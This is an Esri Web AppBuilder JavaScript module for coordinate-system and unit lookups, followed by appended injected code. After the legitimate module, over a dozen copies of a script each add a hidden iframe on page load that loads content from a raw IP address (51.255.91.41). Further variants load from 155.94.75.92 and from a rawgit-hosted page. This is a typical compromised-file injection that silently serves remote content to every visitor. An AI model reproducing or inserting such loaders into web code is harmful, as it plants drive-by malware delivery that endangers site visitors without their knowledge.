// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/promise/all dojo/request esri/SpatialReference ./unitUtils".split(" "),function(b,n,g,p,q,l,k,f){var d=null,h=null,c=!1;b=b(null,function(){});var m=require.toUrl("jimu"),r=l(m+"/SpatialReference/wkidDetails.json",{handleAs:"json"}),t=l(m+"/SpatialReference/transform.json",{handleAs:"json"});b.loadResource=function(){var a=new p;if(d&&h)return a.resolve(),a;q([r,t]).then(function(e){d=e[0];h=e[1];c=!0;a.resolve()},function(e){console.error(e);
c=!1;a.reject(e)});return a};b.getAllCSUnits=function(){if(c){var a=[];g.forEach(d.wkids,n.hitch(this,function(e){e=this.getCSUnit(e);-1===g.indexOf(a,e)&&a.push(e)}));return a}};b.convertUnit=function(a,e,b){if(c)return f.convertUnit(a,e,b)};b.getUnitRate=function(a,b){if(c)return f.getUnitRate(a,b)};b.isProjectUnit=function(a){if(c)return f.isProjectUnit(a)};b.isGeographicUnit=function(a){if(c)return f.isGeographicUnit(a)};b.getGeographicUnits=function(){if(c)return f.getGeographicUnits()};b.getProjectUnits=
function(){if(c)return f.getProjectUnits()};b.getCSUnit=function(a){if(c){a=this.getCSStr(a);var b=0,d=0,b=a.lastIndexOf("UNIT"),d=a.indexOf(",",b);return a.slice(b+6,d-1)}};b.isSameSR=function(a,b){if(c)return a=this.indexOfWkid(a),b=this.indexOfWkid(b),d.labels[a]===d.labels[b]};b.isValidWkid=function(a){if(c)return-1<this.indexOfWkid(a)};b.getSRLabel=function(a){if(c&&this.isValidWkid(a))return a=this.indexOfWkid(a),d.labels[a]};b.indexOfWkid=function(a){if(c)return g.indexOf(d.wkids,a)};b.isWebMercator=
function(a){return k.prototype._isWebMercator?k.prototype._isWebMercator.apply({wkid:parseInt(a,10)},[]):(new k(parseInt(a,10))).isWebMercator()};b.standardizeWkid=function(a){return this.isWebMercator(a)?3857:parseInt(a,10)};b.isValidTfWkid=function(a){if(c)return-1<this.indexOfTfWkid(a)};b.getTransformationLabel=function(a){if(c)return this.isValidTfWkid(a)?(a=this.indexOfTfWkid(a),h.labels[a]):""};b.indexOfTfWkid=function(a){if(c)return g.indexOf(h.tfWkids,a)};b.isGeographicCS=function(a){if(c)return this.isValidWkid(a)?
d.details[this.indexOfWkid(a)].startWith("GEOGCS"):!1};b.isProjectedCS=function(a){if(c)return this.isValidWkid(a)?d.details[this.indexOfWkid(a)].startWith("PROJCS"):!1};b.getGeoCSByProj=function(a){if(c&&this.isProjectedCS(a))return a=this.getSpheroidStr(a),a=g.indexOf(d.details,a),d.wkids[a]};b.getSpheroidStr=function(a){if(c){if(this.isGeographicCS(a))return d.details[this.indexOfWkid(a)];if(this.isProjectedCS(a)){a=d.details[this.indexOfWkid(a)];var b=a.indexOf("GEOGCS"),f=a.indexOf("PROJECTION")-
1;return a.slice(b,f)}return null}};b.getCSStr=function(a){if(c)return d.details[this.indexOfWkid(a)]};b.isSameSpheroid=function(a,b){if(c)return a=this.getSpheroidStr(a),b=this.getSpheroidStr(b),a&&b&&a===b?!0:!1};return b});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});